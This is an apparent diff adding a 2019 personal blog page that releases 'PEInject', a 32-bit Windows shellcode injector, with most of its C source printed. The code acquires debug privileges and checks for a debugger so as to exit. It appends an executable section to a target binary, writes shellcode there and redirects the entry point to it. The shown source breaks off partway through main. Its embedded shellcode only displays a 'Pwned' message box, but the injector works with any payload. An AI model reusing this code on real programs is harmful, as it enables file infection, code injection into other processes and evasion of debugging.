@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html ⚡>
+<head>
+    <meta charset="utf-8">
+
+    <title>32-bit PE injector</title>
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+
+    <link rel="shortcut icon" href="../../favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="../index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    
+    <meta property="og:site_name" content="Mohamed Ali Mrabet " />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="32-bit PE injector" />
+    <meta property="og:description" content="I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . Currently , it does only work with 32-bit executables , please don&#x27;t expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active" />
+    <meta property="og:url" content="http://localhost:2368/32-bit-pe-injector/" />
+    <meta property="article:published_time" content="2019-08-01T14:05:53.000Z" />
+    <meta property="article:modified_time" content="2019-08-01T14:09:02.000Z" />
+    <meta property="article:publisher" content="https://www.facebook.com/dali.mrabet.3" />
+    <meta property="article:author" content="https://www.facebook.com/dali.mrabet.3" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="32-bit PE injector" />
+    <meta name="twitter:description" content="I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . Currently , it does only work with 32-bit executables , please don&#x27;t expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active" />
+    <meta name="twitter:url" content="http://localhost:2368/32-bit-pe-injector/" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="mohamed ali MRABET" />
+    <meta name="twitter:site" content="@Mrabet_Dali" />
+    <meta name="twitter:creator" content="@Mrabet_Dali" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Mohamed Ali Mrabet ",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://localhost:2368/favicon.ico",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "mohamed ali MRABET",
+        "url": "http://localhost:2368/author/mohamed/",
+        "sameAs": [
+            "https://www.facebook.com/dali.mrabet.3",
+            "https://twitter.com/Mrabet_Dali"
+        ]
+    },
+    "headline": "32-bit PE injector",
+    "url": "http://localhost:2368/32-bit-pe-injector/",
+    "datePublished": "2019-08-01T14:05:53.000Z",
+    "dateModified": "2019-08-01T14:09:02.000Z",
+    "description": "I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . Currently , it does only work with 32-bit executables , please don&#x27;t expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:2368/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 2.26" />
+    <link rel="alternate" type="application/rss+xml" title="Mohamed Ali Mrabet " href="../../rss/index.html" />
+
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,600,400" />
+    <style amp-custom>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{margin:0.67em 0;font-size:2em}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{position:relative;vertical-align:baseline;font-size:75%;line-height:0}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}amp-img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace, monospace;font-size:1em}button,input,optgroup,select,textarea{margin:0;color:inherit;font:inherit}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{cursor:pointer;-webkit-appearance:button}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{margin:0 2px;padding:0.35em 0.625em 0.75em;border:1px solid #c0c0c0}legend{padding:0;border:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}html{max-height:100%;height:100%;font-size:62.5%;-webkit-tap-highlight-color:rgba(0, 0, 0, 0)}body{max-height:100%;height:100%;color:#3a4145;background:#f4f8fb;letter-spacing:0.01rem;font-family:"Merriweather", serif;font-size:1.8rem;line-height:1.75em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"kern" 1;-moz-font-feature-settings:"kern" 1;-o-font-feature-settings:"kern" 1}::-moz-selection{background:#d6edff}::selection{background:#d6edff}h1,h2,h3,h4,h5,h6{margin:0 0 0.3em 0;color:#2e2e2e;font-family:"Open Sans", sans-serif;line-height:1.15em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-moz-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-o-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1}h1{text-indent:-2px;letter-spacing:-1px;font-size:2.6rem}h2{letter-spacing:0;font-size:2.4rem}h3{letter-spacing:-0.6px;font-size:2.1rem}h4{font-size:1.9rem}h5{font-size:1.8rem}h6{font-size:1.8rem}a{color:#4a4a4a}a:hover{color:#111}p,ul,ol,dl{margin:0 0 2.5rem 0;font-size:1.5rem;text-rendering:geometricPrecision;-webkit-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-moz-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-o-font-feature-settings:"liga" 1, "onum" 1, "kern" 1}ol,ul{padding-left:2em}ol ol,ul ul,ul ol,ol ul{margin:0 0 0.4em 0;padding-left:2em}dl dt{float:left;clear:left;overflow:hidden;margin-bottom:1em;width:180px;text-align:right;text-overflow:ellipsis;white-space:nowrap;font-weight:700}dl dd{margin-bottom:1em;margin-left:200px}li{margin:0.4em 0}li li{margin:0}hr{display:block;margin:1.75em 0;padding:0;height:1px;border:0;border-top:#efefef 1px solid}blockquote{box-sizing:border-box;margin:1.75em 0 1.75em 0;padding:0 0 0 1.75em;border-left:#4a4a4a 0.4em solid;-moz-box-sizing:border-box}blockquote p{margin:0.8em 0;font-style:italic}blockquote small{display:inline-block;margin:0.8em 0 0.8em 1.5em;color:#ccc;font-size:0.9em}blockquote small:before{content:"\2014 \00A0"}blockquote cite{font-weight:700}blockquote cite a{font-weight:normal}mark{background-color:#fdffb6}code,tt{padding:1px 3px;border:#e3edf3 1px solid;background:#f7fafb;border-radius:2px;white-space:pre-wrap;font-family:Inconsolata, monospace, sans-serif;font-size:0.85em;font-feature-settings:"liga" 0;-webkit-font-feature-settings:"liga" 0;-moz-font-feature-settings:"liga" 0}pre{overflow:auto;box-sizing:border-box;margin:0 0 1.75em 0;padding:10px;width:100%;border:#e3edf3 1px solid;background:#f7fafb;border-radius:3px;white-space:pre;font-family:Inconsolata, monospace, sans-serif;font-size:0.9em;-moz-box-sizing:border-box}pre code,pre tt{padding:0;border:none;background:transparent;white-space:pre-wrap;font-size:inherit}kbd{display:inline-block;margin-bottom:0.4em;padding:1px 8px;border:#ccc 1px solid;background:#f4f4f4;border-radius:4px;box-shadow:0 1px 0 rgba(0, 0, 0, 0.2), 0 1px 0 0 #fff inset;color:#666;text-shadow:#fff 0 1px 0;font-size:0.9em;font-weight:700}table{box-sizing:border-box;margin:1.75em 0;max-width:100%;width:100%;background-color:transparent;-moz-box-sizing:border-box}table th,table td{padding:8px;border-top:#efefef 1px solid;vertical-align:top;text-align:left;line-height:20px}table th{color:#000}table caption + thead tr:first-child th,table caption + thead tr:first-child td,table colgroup + thead tr:first-child th,table colgroup + thead tr:first-child td,table thead:first-child tr:first-child th,table thead:first-child tr:first-child td{border-top:0}table tbody + tbody{border-top:#efefef 2px solid}table table table{background-color:#fff}table tbody > tr:nth-child(odd) > td,table tbody > tr:nth-child(odd) > th{background-color:#f6f6f6}table.plain tbody > tr:nth-child(odd) > td,table.plain tbody > tr:nth-child(odd) > th{background:transparent}iframe,amp-iframe,.fluid-width-video-wrapper{display:block;margin:1.75em 0}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper amp-iframe{margin:0}textarea,select,input{margin:0 0 5px 0;padding:6px 9px;width:260px;outline:0;border:#e7eef2 1px solid;background:#fff;border-radius:4px;box-shadow:none;font-family:"Open Sans", sans-serif;font-size:1.6rem;line-height:1.4em;font-weight:100;-webkit-appearance:none}textarea{min-width:250px;min-height:80px;max-width:340px;width:100%;height:auto}input[type="text"]:focus,input[type="email"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="number"]:focus,input[type="date"]:focus,input[type="month"]:focus,input[type="week"]:focus,input[type="time"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,textarea:focus{outline:none;outline-width:0;border:#bbc7cc 1px solid;background:#fff}select{width:270px;height:30px;line-height:30px}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}.clearfix{zoom:1}.main-header{position:relative;display:table;overflow:hidden;box-sizing:border-box;width:100%;height:50px;background:#5ba4e5 no-repeat center center;background-size:cover;text-align:left;-webkit-box-sizing:border-box;-moz-box-sizing:border-box}.content{background:#fff;padding-top:15px}.blog-title,.content{margin:auto;max-width:600px}.blog-title a{display:block;padding-right:16px;padding-left:16px;height:50px;color:#fff;text-decoration:none;font-family:"Open Sans", sans-serif;font-size:16px;line-height:50px;font-weight:600}.post{position:relative;margin-top:0;margin-right:16px;margin-left:16px;padding-bottom:0;max-width:100%;border-bottom:#ebf2f6 1px solid;word-wrap:break-word;font-size:0.95em;line-height:1.65em}.post-header{margin-bottom:1rem}.post-title{margin-bottom:0}.post-title a{text-decoration:none}.post-meta{display:block;margin:3px 0 0 0;color:#9eabb3;font-family:"Open Sans", sans-serif;font-size:1.3rem;line-height:2.2rem}.post-meta a{color:#9eabb3;text-decoration:none}.post-meta a:hover{text-decoration:underline}.post-meta .author{margin:0;font-size:1.3rem;line-height:1.3em}.post-date{display:inline-block;text-transform:uppercase;white-space:nowrap;font-size:1.2rem;line-height:1.2em}.post-image{margin:0;padding-top:3rem;padding-bottom:30px;border-top:1px #E8E8E8 solid}.post-content amp-img,.post-content amp-anim{position:relative;left:50%;display:block;padding:0;min-width:0;max-width:112%;width:calc(100% + 32px);height:auto;transform:translateX(-50%);-webkit-transform:translateX(-50%);-ms-transform:translateX(-50%)}.footnotes{font-size:1.3rem;line-height:1.6em;font-style:italic}.footnotes li{margin:0.6rem 0}.footnotes p{margin:0}.footnotes p a:last-child{text-decoration:none}.site-footer{position:relative;margin:0 auto 20px auto;padding:1rem 15px;max-width:600px;color:rgba(0,0,0,0.5);font-family:"Open Sans", sans-serif;font-size:1.1rem;line-height:1.75em}.site-footer a{color:rgba(0,0,0,0.5);text-decoration:none;font-weight:bold}.site-footer a:hover{border-bottom:#bbc7cc 1px solid}.poweredby{display:block;float:right;width:45%;text-align:right}.copyright{display:block;float:left;width:45%}</style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    
+
+</head>
+
+<body class="amp-template">
+    <header class="main-header">
+        <nav class="blog-title">
+            <a href="../../index.html">Mohamed Ali Mrabet </a>
+        </nav>
+    </header>
+
+    <main class="content" role="main">
+        <article class="post">
+
+            <header class="post-header">
+                <h1 class="post-title">32-bit PE injector</h1>
+                <section class="post-meta">
+                    <p class="author">by <a href="../../author/mohamed/index.html">mohamed ali MRABET</a></p>
+                    <time class="post-date" datetime="2019-08-01">2019-08-01</time>
+                </section>
+            </header>
+            <section class="post-content">
+
+                I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . <br />Currently , it does only work with 32-bit executables , please don't expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active on it. <br /> On Windows XP it allocates enough room for the shellcode and executes it with 'CreateRemoteThread'. Because On Windows Vista/Win7/Win8.1 the'CreateRemoteThread' does not work smoothly due to some additional protection mechanisms ,so the injector creates an extra section named "L0phtTN" and loads it with a shellcode and then jumps back to the OEP .<pre class="line-numbers"><code class="lang-c">
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+
+
+// simple shellcode that displays msgBox  "Pwned by l0pht_TN" preceded by pushad and followed popad and jmp opcodes
+
+static  char  l0phtTN_shellcode[] =
+    "\x60\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
+    "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
+    "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
+    "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
+    "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
+    "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
+    "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
+    "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
+    "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
+    "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
+    "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
+    "\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56"
+    "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52"
+    "\xe8\x61\xff\xff\xff\x68\x64\x21\x21\x58\x68\x70\x77\x6e\x65"
+    "\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68\x4e\x58\x20\x20\x68\x70"
+    "\x68\x74\x54\x68\x6f\x20\x4c\x30\x68\x74\x7a\x20\x74\x68\x47"
+    "\x72\x65\x65\x31\xc9\x88\x4c\x24\x11\x89\xe1\x31\xd2\x52\x53"
+    "\x51\x52\xff\xd0\x31\xc0\x50\x61\xe9";    // put \xff\x55\x08 before /0x61 / 0xe9 if you desire to exitprocess() and not return to the OEP
+
+/*
+the following func adds a section named "L0phtTN" to the desired target .
+if the executable(target) is packed , or ASLR and DEP are active on it
+then the process injection would fail !!
+*/
+BOOL AddL0phtTnSection(char * path )
+{
+    // load the target
+    HANDLE target =  CreateFile(path, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE  ,NULL,OPEN_EXISTING,NULL,NULL);
+    if(target ==  INVALID_HANDLE_VALUE )
+    {
+        perror("Error in CreateFile()");
+        ExitProcess(-1);
+
+    }
+    DWORD  target_size = 0 ;
+// get the executable's size
+    target_size =  GetFileSize(target,0);
+    if(target_size == 0)
+    {
+        perror("Error in GetFileSize()");
+        ExitProcess(-1);
+    }
+
+    IMAGE_DOS_HEADER IDH ;
+    unsigned int n = 0 ;
+    //read the DOS_header
+    if(!ReadFile(target,&amp;IDH,sizeof(IMAGE_DOS_HEADER),&amp;n,NULL))
+    {
+        perror("Error in ReadFile() (IMAGE_DOS_HEADER) ");
+        ExitProcess(-1);
+    }
+    // checks whether is is a valid executable
+    if(IDH.e_magic != IMAGE_DOS_SIGNATURE)
+    {
+        perror("invalid DOS signture");
+        ExitProcess(-1);
+    }
+
+    IMAGE_NT_HEADERS INH = {0};
+    //sets the file pointer to the begginning of the NT header using e_lfanew value (which in turn points to it)
+    SetFilePointer(target,IDH.e_lfanew,NULL,FILE_BEGIN);
+    //now reaad the NT_header
+    if(!ReadFile(target,&amp;INH,sizeof(IMAGE_NT_HEADERS),&amp;n,NULL))
+    {
+        perror("Error in ReadFile() (IMAGE_NT_HEADERS)");
+        ExitProcess(-1);
+    }
+    //checks its signature  (0x4550 if is valid )
+    if(INH.Signature != IMAGE_NT_SIGNATURE)
+    {
+        perror("invalid NT signature ");
+        ExitProcess(-1);
+    }
+    //read the number of sections
+    DWORD  Number_Sections = INH.FileHeader.NumberOfSections ;
+    //now points to the last section
+    SetFilePointer(target,IDH.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * (Number_Sections -1 ) ) ,NULL,FILE_BEGIN);
+    IMAGE_SECTION_HEADER last_section = {0};
+    //get the last section
+    ReadFile(target,&amp;last_section,sizeof(IMAGE_SECTION_HEADER),&amp;n,NULL) ;
+    //allocate enough space to store the whole executable
+    BYTE * myfile = (BYTE *)malloc(sizeof(BYTE) * target_size);
+    Sleep(500) ;
+    //points to the beggining of the target
+    SetFilePointer(target,0,NULL,FILE_BEGIN);
+    //store the whole target in myfile variable
+    ReadFile(target,myfile,target_size,&amp;n,NULL);
+    Sleep(500);
+    // ISH is pointer to the end of the last section
+    PIMAGE_SECTION_HEADER ISH =  ( PIMAGE_SECTION_HEADER )(myfile + IDH.e_lfanew+sizeof(IMAGE_NT_HEADERS)+(sizeof(IMAGE_SECTION_HEADER) * Number_Sections) );
+    // PINH points to the NT_Header
+    PIMAGE_NT_HEADERS PINH = ( PIMAGE_NT_HEADERS )(myfile + IDH.e_lfanew );
+    // put the new section's name ...replace it with your desired section's name
+    strncpy(ISH-&gt;Name,"L0phtTN",8);
+    // sets the Characteristics of the new section to (read , write , execute ) and initialized just in case for relocation stufff
+    ISH-&gt;Characteristics = ( IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE );
+    // align the value of SizeOfRawData based FileAlignment value of the target
+    ISH-&gt;SizeOfRawData = (0X1000 % INH.OptionalHeader.FileAlignment == 0 )? 0X1000 :((0X1000/INH.OptionalHeader.FileAlignment+1) * INH.OptionalHeader.FileAlignment )  ;
+    // align the beggining of the new section when it on the HD
+    ISH-&gt;PointerToRawData = (last_section.SizeOfRawData % INH.OptionalHeader.FileAlignment == 0 )?(last_section.SizeOfRawData+last_section.PointerToRawData):(last_section.PointerToRawData + (last_section.SizeOfRawData/INH.OptionalHeader.FileAlignment+1)*INH.OptionalHeader.FileAlignment);
+    // align the size , when is loaded into the memory
+    ISH-&gt;Misc.VirtualSize = (0x1000 % INH.OptionalHeader.SectionAlignment == 0) ? 0x1000 :((0x1000/INH.OptionalHeader.SectionAlignment + 1) * INH.OptionalHeader.SectionAlignment) ;
+    // align the VirtualAddress when loaded into the memory
+    ISH-&gt;VirtualAddress =(last_section.Misc.VirtualSize % INH.OptionalHeader.SectionAlignment == 0)?(last_section.Misc.VirtualSize + last_section.VirtualAddress):(last_section.VirtualAddress+ (last_section.Misc.VirtualSize/INH.OptionalHeader.SectionAlignment +1)*INH.OptionalHeader.SectionAlignment);
+    // increments the NumberOfSections' value
+    PINH-&gt;FileHeader.NumberOfSections++;
+    // SizeOfImage's value must be increased by section's VirtualSize value
+    PINH-&gt;OptionalHeader.SizeOfImage = ISH-&gt;VirtualAddress + ISH-&gt;Misc.VirtualSize ;
+
+    SetFilePointer(target,ISH-&gt;SizeOfRawData +ISH-&gt;PointerToRawData,NULL,FILE_BEGIN);
+    SetEndOfFile(target) ;
+    SetFilePointer(target,0,NULL,FILE_BEGIN);
+    if( !WriteFile(target,myfile,target_size,&amp;n,NULL) || n != target_size )
+    {
+        perror("could not write into the executable ");
+        return FALSE;
+    }
+    CloseHandle(target);
+    // the function which is responsible for shellcode injection
+    puts("New section Added ");
+    InjectShellcode(path,ISH-&gt;VirtualAddress,ISH-&gt;PointerToRawData,l0phtTN_shellcode,sizeof(l0phtTN_shellcode)+30);
+    Sleep(500) ;
+    return TRUE ;
+}
+
+
+BOOL CheckProcess(DWORD pid )
+{
+    PROCESSENTRY32 current_process ;
+    HANDLE proc_list ;
+    //
+    // DWORD priority ;
+
+    proc_list = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0) ;
+    if( proc_list == INVALID_HANDLE_VALUE )
+    {
+
+       return FALSE ;
+    }
+
+    current_process.dwSize = sizeof(PROCESSENTRY32);
+
+    if(!Process32First(proc_list,¤t_process))
+    {
+
+        perror("error in Process32First \n");
+        return FALSE ;
+    }
+
+    while(1)
+    {
+        if((DWORD)pid == current_process.th32ProcessID )
+        {
+
+            return  TRUE ;
+        }
+
+        if(!Process32Next(proc_list,¤t_process))
+            break ;
+    }
+
+    CloseHandle(proc_list) ;
+    return FALSE ;
+}
+/*
+according to MSDN : "The debug privilege allows someone to debug a process that they wouldn’t otherwise have access to.
+For example, a process running as a user with the debug privilege enabled on its token can debug a service running as local system."
+for more information :
+ http://msdn.microsoft.com/en-us/library/windows/hardware/ff541528(v=vs.85).aspx
+*/
+BOOL GetDebugPrivileges(void)
+{
+    HANDLE token;
+    TOKEN_PRIVILEGES priv;
+    BOOL ret = FALSE;
+
+    if (OpenProcessToken(GetCurrentProcessId(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY , &amp;token))
+    {
+        priv.PrivilegeCount = 1;
+        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;priv.Privileges[0].Luid) != FALSE &amp;&amp; AdjustTokenPrivileges(token, FALSE, &amp;priv, 0, NULL, NULL) != FALSE)
+        {
+            ret = TRUE;
+        }
+        CloseHandle(token);
+    }
+    return ret;
+}
+static DWORD Target_Base_addr  = 0;
+
+char * GetTargetPath(DWORD pid)
+{
+    MODULEENTRY32 current;
+
+    HANDLE snapshot;
+
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,pid);
+    if (snapshot == INVALID_HANDLE_VALUE)
+    {
+        fprintf(stderr,"error in CreateToolhelp32Snapshot");
+        ExitProcess(-1) ;
+    }
+
+    current.dwSize = sizeof(MODULEENTRY32);
+    if(!Module32First(snapshot,¤t))
+    {
+        fprintf(stderr,"error in Module32First");
+        ExitProcess(-1) ;
+    }
+    while(1)
+    {
+        if(current.th32ProcessID == pid)
+        {
+            char * mpath = (char *)malloc(sizeof(char) * strlen(current.szExePath)+1);
+            // printf("%s",current.szExePath);
+            *(mpath + strlen(current.szExePath)) = '\0' ;
+            //copy the path of executable
+            memcpy(mpath,¤t.szExePath,sizeof(char) * strlen(current.szExePath));
+            //get the baseadress of the target
+            Target_Base_addr = current.modBaseAddr ;
+            return mpath;
+        }
+
+        if(!Module32Next(snapshot,¤t))
+            break ;
+
+    }
+    CloseHandle(snapshot) ;
+    return NULL ;
+}
+
+BOOL InjectShellcode(char * path, DWORD new_entrypoint , DWORD RVA , char * sc, unsigned int shell_size)
+{
+
+
+    HANDLE Inject_Me = CreateFile(path, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL , OPEN_EXISTING ,NULL,NULL);
+    if(Inject_Me == INVALID_HANDLE_VALUE )
+    {
+        fprintf(stderr ,"error while injecting the shellcode !");
+        ExitProcess(-1) ;
+    }
+    IMAGE_DOS_HEADER IDH = {0} ;
+    IMAGE_NT_HEADERS INH = {0} ;
+    //where the return adress must be stored
+    int ret = 0;
+    int a ;
+    char cret[30];
+    memset(cret,(int)'\0',30);
+    if( !ReadFile(Inject_Me,&amp;IDH,sizeof(IMAGE_DOS_HEADER),&amp;a,FILE_BEGIN))
+    {
+        perror("readfile() error 1");
+        exit(-1) ;
+    }
+    char jmp_to_entrypoint[sizeof(l0phtTN_shellcode) + 30];
+    memset(jmp_to_entrypoint,(int)'\0',sizeof(l0phtTN_shellcode) + 30);
+// points to the beggining of NT_section
+    SetFilePointer(Inject_Me,IDH.e_lfanew , NULL , FILE_BEGIN);
+    /// puts the content of the NT-section into INH struct
+    ReadFile(Inject_Me,&amp;INH,sizeof(IMAGE_NT_HEADERS),&amp;a,FILE_BEGIN);
+    printf("\n  Original EntryPoint :%X \n ",INH.OptionalHeader.AddressOfEntryPoint);
+    ret = INH.OptionalHeader.AddressOfEntryPoint  + INH.OptionalHeader.ImageBase ;
+    // Because the jmp instruction encodes the next 5 opcodes like (the following : OEP - current adress ) - 5
+    //
+    ret =  (INH.OptionalHeader.AddressOfEntryPoint - (new_entrypoint + strlen(l0phtTN_shellcode) - 1 ) - 5 ) ;  // just to calculate the return address
+    // fill cret array with return adress in little endian format  !!
+    sprintf(cret," Return Adress : %0.2x%0.2x%0.2x%0.2x",( (ret &lt;&lt; 16 )&amp;0x00ff0000) &gt;&gt; 16 ,((ret &lt;&lt; 8 )&amp;0x00ff0000 ) &gt;&gt; 16 ,(ret &gt;&gt; 16 )&amp;0x000000ff ,(ret &gt;&gt; 24 )&amp; 0x000000ff );
+    // puts(cret);
+    //
+    memcpy(jmp_to_entrypoint,l0phtTN_shellcode,strlen(l0phtTN_shellcode));
+    // change the entry point of the target to virtual address of the L0phtTn section
+    INH.OptionalHeader.AddressOfEntryPoint = new_entrypoint ;
+    // replace the modified nt_section
+    SetFilePointer(Inject_Me,IDH.e_lfanew,NULL,FILE_BEGIN);
+    // replace the modified nt_section
+    WriteFile(Inject_Me,&amp;INH,sizeof(IMAGE_NT_HEADERS),&amp;a,FILE_BEGIN);
+    unsigned int isread = 0 ;
+
+    SetFilePointer(Inject_Me,RVA,NULL,FILE_BEGIN);
+
+    if(!WriteFile(Inject_Me,&amp;jmp_to_entrypoint,shell_size,&amp;isread,NULL) || isread != shell_size )
+    {
+        perror("cannot inject (WriteFile)");
+        ExitProcess(-1) ;
+    }
+    // sets the file pointer to end of the shellcode
+    SetFilePointer(Inject_Me,RVA+strlen(l0phtTN_shellcode)  ,NULL,FILE_BEGIN) ;
+    //and append it with the new return address
+    WriteFile(Inject_Me,&amp;ret,sizeof(long long),&amp;isread,NULL);
+    return TRUE ;
+}
+int Is_It_Debugged = 0 ;
+int main(int argc, char **argv)
+{
+
+    HANDLE my_exe ;
+    IMAGE_DOS_HEADER IDH;
+    DWORD pid = 0;
+    HANDLE target;
+
+    DWORD nbytes;
+    IMAGE_NT_HEADERS INH;
+    // get the TIB (thread information block )
+    asm("mov eax, dword ptr fs:[0x18]");
+    // get the PEB (process information block)
+    asm("mov eax, dword ptr ds:[eax+0x30]");
+    // get the beingDebugger flag
+    asm("movzx eax, byte ptr ds:[eax+0x2]");
+
+    asm("mov _Is_It_Debugged, eax");
+
+    if (Is_It_Debugged == 1)
+    {
+        ExitProcess(-1) ;
+    }
+     pid = atoi(argv[1]) ;
+    if( argc != 2 || pid  ==  0)
+    {
+        fprintf(stdout," \nUsage : %s  \n",argv[0]);
+        exit(-1);
+    }
+
+    printf("%d\n",pid);
+   // Sleep(500);
+    // check if the target is running
+    if(CheckProcess(pid) == FALSE)
+    {
+        fprintf(stderr," \n %d not found on the list \n",pid);
+        ExitProcess(-1) ;
+    }
+    printf("passed");
+    // get path of the target (executable )
+    char * pathh =  GetTargetPath(pid);
+    //just in case when the anti-debug is bypassed ,the debugger is still get fooled by the anti-tracing (int 2d )
+/*
+    if(Is_It_Debugged == 1)
+    {
+        asm("pushad");
+        asm("int 0x2d");
+    }
+*/
+    // debug privileges are badly needed to get the processes running list without some issues
+    GetDebugPrivileges();
+    //checks if it is running under XP
+
+    if(((int)(GetVersion() &amp; 0x000000ff)) == 5 )
+    {
+
+        if(Target_Base_addr == 0 )
+        {
+            fprintf(stderr," could not get the base adress of the process \n");
+            ExitProcess(-1) ;
+        }
+        printf("\n 0x%X \n",Target_Base_addr);
+        //open the target's process
+        if((my_exe = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) == INVALID_HANDLE_VALUE )
+        {
+            fprintf(stderr," process not found ");
+            ExitProcess(-1);
+        }
+        //read the DOS_header
+        if(!ReadProcessMemory(my_exe,Target_Base_addr,&amp;IDH,sizeof(IMAGE_DOS_HEADER),&amp;nbytes)  || nbytes !=  sizeof(IMAGE_DOS_HEADER) || IDH.e_magic != 0x5a4d )
+        {
+            fprintf(stderr,"\n error in ReadProcessMemory() \n");
+            ExitProcess(-1) ;
+        }
+        //read the NT_heaader
